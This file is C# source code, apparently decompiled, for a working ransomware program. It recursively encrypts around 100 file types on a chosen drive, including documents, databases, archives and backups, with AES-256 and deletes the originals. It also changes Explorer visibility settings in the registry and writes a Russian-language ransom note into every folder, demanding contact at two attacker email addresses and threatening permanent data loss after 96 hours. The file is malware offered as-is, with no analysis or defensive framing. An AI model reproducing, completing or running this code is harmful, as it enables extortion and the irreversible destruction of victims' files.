using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication8;

internal class Program
{
	public class DecryptionFile
	{
		public void FileDecrypt(string inputFile, string outputFile, string password)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			byte[] array = new byte[32];
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.Read(array, 0, array.Length);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CFB;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
				{
					Application.DoEvents();
					fileStream2.Write(array2, 0, count);
				}
			}
			catch (CryptographicException ex)
			{
				Console.WriteLine("CryptographicException error: " + ex.Message);
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error: " + ex2.Message);
			}
			try
			{
				cryptoStream.Close();
			}
			catch (Exception ex3)
			{
				Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
			}
			finally
			{
				fileStream2.Close();
				fileStream.Close();
			}
		}
	}

	public class EncryptionFile
	{
		public void FileEncrypt(string inputFile, string password)
		{
			byte[] array = GenerateRandomSalt();
			FileStream fileStream = new FileStream(inputFile + ".aes", FileMode.Create);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CFB;
			fileStream.Write(array, 0, array.Length);
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
				{
					Application.DoEvents();
					cryptoStream.Write(array2, 0, count);
				}
				fileStream2.Close();
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
			finally
			{
				cryptoStream.Close();
				fileStream.Close();
			}
		}
	}

	private static void Main(string[] args)
	{
		if (!File.Exists("C:\\ssssa1.txt"))
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
			currentUser.SetValue("ShowSuperHidden", 1, RegistryValueKind.DWord);
			currentUser.Close();
			RegistryKey currentUser2 = Registry.CurrentUser;
			currentUser2 = currentUser2.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
			currentUser2.SetValue("Hidden", 1, RegistryValueKind.DWord);
			currentUser2.Close();
			Console.WriteLine("id=");
			string text = Console.ReadLine();
			File.WriteAllText("C:\\ssssa1.txt", text ?? "");
			string text2 = File.ReadAllText("C:\\ssssa1.txt");
			File.WriteAllText("C:\\readme.txt", string.Concat("Здравствуйте !\r\n Все ваши файлы зашифрованы самым стойким алгоритмом шифрования AES, данный алгоритм не возможно расшифровать без ключа!\r\n * ************************************************************************\r\n Чтобы получить ключ пришлите на почту cripton7zp@mailfence.com, или если долго нету  ответа  то на резервную  почту  пишите cripton7zp@tutanota.com ваш ID и пару зашифрованных файлов для дешифровки !\r\n Это вам гарантирует что я могу вам все файлы расшифровать!Если не пишите в течении 96 часов  тогда ваш ключ удаляется  и файлы уже  невозможно  будет  расшифровать!!!\r\n * *********************************************************************\r\n  ВАЩ ID: " + text2 + "\r\n", "\r\nТакже если  долго не отвечаю или ошибки при  отправке  то ....\r\nИз - за недавних событий в правительстве, рекомендую   писать с Gmail или с yahoo mail \r\nИли сразу с этих доменов пишите  и лучше пишите сразу на две  почты одновременно а то мало ли что  !\r\nА еще лучше для  надежности  можете зарегистрироваться  через ВПН или через ТОР браузер  на protonmail.com и написать  мне !\r\nТогда  100 процентов письмо придет !\r\n\r\nP.S НЕ ПИШИТЕ С МАЙЛ РУ  !!!!!!!!!!!!!!! С МАЙЛ РУ ПОЧТА МНЕ НЕ ПРИХОДИТ  А ЕСЛИ И ПРИХОДИТ ТО Я НЕ МОГУ НА НЕЕ ОТВЕТИТЬ  !!! \r\n!!! НЕ БЕСИТЕ МЕНЯ  ПОЖАЛУЙСТА \tС ВАШИМ  ЛЮБИИМЫМ МААЙЛ РУ !\r\n ЕСЛИ ВАМ РЕАЛЬНО НУЖНЫ  ФАЙЛЫ  ТО ПОЖАЛУЙСТА ПИШИТЕ С ЧЕЛОВЕЧЕСКИХ ЯЩИКОВ !!! \r\n\r\nP.S 2 ПОЖАЛУЙСТА  ДУМАЙТЕ О ЛЮДЯХ КОГДА  ХОТИТЕ  КАКИМ ТО ОБРАЗОМ  ЗАБЛОКИРОВАТЬ МОЮ  ПОЧТУ \r\n ВЫ  БОЛЬШЕ ВРЕДИТЕ  ЛЮДЯМ КОТОРЫМ  ОЧЕНЬ ОЧЕНЬ  ВАЖНО БЫВАЕТ  РАСШИФРОВАТЬ ФАЙЛЫ И  ВЫ ИМ ВРЕДИТЕ  БОЛЬШЕ ЧЕМ   МНЕ !!!!\r\n\r\nP.S 3 ЕСЛИ  ПЫТАЕТЕСЬ  САМИ  РАСШИФРОВАТЬ ИЛИ ЧТО ТО СДЕЛАТЬ  С ФАЙЛАМИ  ТО РЕКОМЕНДУЮ СДЕЛАТЬ КОПИИ \r\nА ПОТОМ  ЕСЛИ ХОТИТЕ  ПРОБОВАТЬ ВСЯКИМИ  БЕЗПОЛЕЗНЫМИ ПРОГРАММАМИ ЧТОБЫ ВЫ ИХ НЕ ИСПОРТИЛИ СОВСЕМ !\r\n ТАК ЖЕ ЕСЛИ У ВАС RAID 1 ИЛИ RAID 10    ТО РЕКОМЕНДУЮЮ ПЕРЕПРОВЕРИТЬ  А ПОТОМУ УЖЕ   ДОСТАВАТЬ  ОДИН ДИСК \r\n  ПОТОМУ ЧТО   СКОРЕЕ ВСЕКГО    ВАШИ РАЙДЫ  ПРЕВРАТИЛИЛИСЬ В  ОБЫЧНЫЕ ДИСКИ ИЛИ  В  RAID 0  И ЕСЛИ  RAID 0  ТО МОЖНО  ИСПОРТИТЬ  ФАЙЛЫ  СОВСЕМ !!!!!!!!!!!"));
		}
		string text3 = File.ReadAllText("C:\\ssssa1.txt");
		string password = Console.ReadLine();
		string text4 = Console.ReadLine();
		string[] array = new string[1] { text4 + ":" };
		Console.WriteLine(array);
		string[] array2 = array;
		foreach (string path in array2)
		{
			IEnumerable<string> enumerable = SafeEnumerateFiles(path, new string[100]
			{
				"*.arh", "*.ARH", "*.cpt", "*.BAK", "*.bak", "*.MDF", "*.csv", "*.RAR", "*.rar", "*.ZIP",
				"*.zip", "*.cdd", "*.tib", "*.cpp", "*.doc", "*.docm", "*.docx", "*7z", "*.dot", "*.dotm",
				"*.dotx", "*.epub", "*.fb2", "*.gpx", "*.ods", "*.ibooks", "*.indd", "*.kdc", "*.1CD", "*.key",
				"*.kml", "*.mdb", "*.mdf", "*.mobi", "*.mso", "*.ods", "*.odt", "*.one", "*.oxps", "*.pages",
				"*.pdf", "*.pkg", "*.pl", "*.pot", "*.potm", "*.potx", "*.pps", "*.ppsm", "*.ppsx", "*.ppt",
				"*.pptm", "*.pptx", "*.ps", "*.pub", "*.rtf", "*.sdf", "*.sgml", "*.sldm", "*.snb", "*.wpd",
				"*.wpd", "*.wpd", "*.wps", "*.wps", "*.xar", "*.xlr", "*.xls", "*.xls", "*.xls", "*.xlsb",
				"*.xlsm", "*.xlsx", "*.xlt", "*.xltm", "*.xltx", "*.xps", "*.accdb", "*.b2", "*.crypt", "*.crypt5",
				"*.crypt6", "*.crypt7", "*.crypt8", "*.crypt12", "*.db", "*.dt ", "*.md", "*.cdx", "*.dbf", "*.dbx",
				"*.kdc", "*.mdb", "*.mdf", "*.sdf", "*.sis", "*.1cd", "*.xsl ", "*.xslt", "*.jpg", "*.JPG"
			}, SearchOption.AllDirectories);
			foreach (string item in enumerable)
			{
				EncryptionFile encryptionFile = new EncryptionFile();
				Console.WriteLine(item);
				encryptionFile.FileEncrypt(item, password);
				File.Delete(item);
				File.WriteAllText(Path.GetDirectoryName(item) + "/readme.txt", string.Concat("Здравствуйте !\r\n Все ваши файлы зашифрованы самым стойким алгоритмом шифрования AES , данный алгоритм не возможно расшифровать без ключа!\r\n*************************************************************************\r\n Чтобы получить ключ пришлите на почту cripton7zp@mailfence.com , или если долго нету  ответа  то на резервную  почту  пишите cripton7zp@tutanota.com ваш ID и пару зашифрованных файлов для дешифровки !\r\n Это вам гарантирует что я могу вам все файлы расшифровать! Если не пишите в течении 96 часов  тогда ваш ключ удаляется  и файлы уже  невозможно  будет  расшифровать!!!\r\n**********************************************************************\r\n  ВАЩ ID: " + text3 + "\r\n", "\r\nТакже если  долго не отвечаю или ошибки при  отправке  то ....\r\nИз - за недавних событий в правительстве, рекомендую   писать с Gmail или с yahoo mail \r\nИли сразу с этих доменов пишите  и лучше пишите сразу на две  почты одновременно а то мало ли что  !\r\nА еще лучше для  надежности  можете зарегистрироваться  через ВПН или через ТОР браузер  на protonmail.com и написать  мне !\r\nТогда  100 процентов письмо придет !\r\n\r\nP.S НЕ ПИШИТЕ С МАЙЛ РУ  !!!!!!!!!!!!!!! С МАЙЛ РУ ПОЧТА МНЕ НЕ ПРИХОДИТ  А ЕСЛИ И ПРИХОДИТ ТО Я НЕ МОГУ НА НЕЕ ОТВЕТИТЬ  !!! \r\n!!! НЕ БЕСИТЕ МЕНЯ  ПОЖАЛУЙСТА \tС ВАШИМ  ЛЮБИИМЫМ МААЙЛ РУ !\r\n ЕСЛИ ВАМ РЕАЛЬНО НУЖНЫ  ФАЙЛЫ  ТО ПОЖАЛУЙСТА ПИШИТЕ С ЧЕЛОВЕЧЕСКИХ ЯЩИКОВ !!! \r\n\r\nP.S 2 ПОЖАЛУЙСТА  ДУМАЙТЕ О ЛЮДЯХ КОГДА  ХОТИТЕ  КАКИМ ТО ОБРАЗОМ  ЗАБЛОКИРОВАТЬ МОЮ  ПОЧТУ \r\n ВЫ  БОЛЬШЕ ВРЕДИТЕ  ЛЮДЯМ КОТОРЫМ  ОЧЕНЬ ОЧЕНЬ  ВАЖНО БЫВАЕТ  РАСШИФРОВАТЬ ФАЙЛЫ И  ВЫ ИМ ВРЕДИТЕ  БОЛЬШЕ ЧЕМ   МНЕ !!!!\r\n\r\nP.S 3 ЕСЛИ  ПЫТАЕТЕСЬ  САМИ  РАСШИФРОВАТЬ ИЛИ ЧТО ТО СДЕЛАТЬ  С ФАЙЛАМИ  ТО РЕКОМЕНДУЮ СДЕЛАТЬ КОПИИ \r\nА ПОТОМ  ЕСЛИ ХОТИТЕ  ПРОБОВАТЬ ВСЯКИМИ  БЕЗПОЛЕЗНЫМИ ПРОГРАММАМИ ЧТОБЫ ВЫ ИХ НЕ ИСПОРТИЛИ СОВСЕМ !\r\n ТАК ЖЕ ЕСЛИ У ВАС RAID 1 ИЛИ RAID 10    ТО РЕКОМЕНДУЮЮ ПЕРЕПРОВЕРИТЬ  А ПОТОМУ УЖЕ   ДОСТАВАТЬ  ОДИН ДИСК \r\n  ПОТОМУ ЧТО   СКОРЕЕ ВСЕКГО    ВАШИ РАЙДЫ  ПРЕВРАТИЛИЛИСЬ В  ОБЫЧНЫЕ ДИСКИ ИЛИ  В  RAID 0  И ЕСЛИ  RAID 0  ТО МОЖНО  ИСПОРТИТЬ  ФАЙЛЫ  СОВСЕМ !!!!!!!!!!!"));
			}
		}
	}

	private static IEnumerable<string> SafeEnumerateFiles(string path, string[] searchPatterns, SearchOption searchOption)
	{
		Stack<string> dirs = new Stack<string>();
		dirs.Push(path);
		while (dirs.Count > 0)
		{
			string currentDirPath = dirs.Pop();
			if (searchOption == SearchOption.AllDirectories)
			{
				try
				{
					string[] subDirs = Directory.GetDirectories(currentDirPath);
					string[] array = subDirs;
					foreach (string subDirPath in array)
					{
						FileAttributes attributes = File.GetAttributes(subDirPath);
						bool isSystem = (attributes & FileAttributes.System) == FileAttributes.System;
						bool isDirectory = (attributes & FileAttributes.Directory) == FileAttributes.Directory;
						FileAttributes attributes2 = File.GetAttributes(subDirPath);
						bool isSystemh = (attributes2 & FileAttributes.System) == FileAttributes.Hidden;
						bool isDirectoryh = (attributes2 & FileAttributes.Directory) == FileAttributes.Directory;
						if (!isSystem && !isDirectory && isSystemh && !isDirectoryh)
						{
							dirs.Push(subDirPath);
						}
						if ((File.GetAttributes(subDirPath) & (FileAttributes.Hidden | FileAttributes.System)) != (FileAttributes.Hidden | FileAttributes.System))
						{
							dirs.Push(subDirPath);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
					continue;
				}
				catch (DirectoryNotFoundException)
				{
					continue;
				}
			}
			foreach (string searchPattern in searchPatterns)
			{
				string[] files;
				try
				{
					files = Directory.GetFiles(currentDirPath, searchPattern);
				}
				catch (UnauthorizedAccessException)
				{
					break;
				}
				catch (DirectoryNotFoundException)
				{
					break;
				}
				string[] array2 = files;
				for (int k = 0; k < array2.Length; k++)
				{
					yield return array2[k];
				}
			}
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}
}
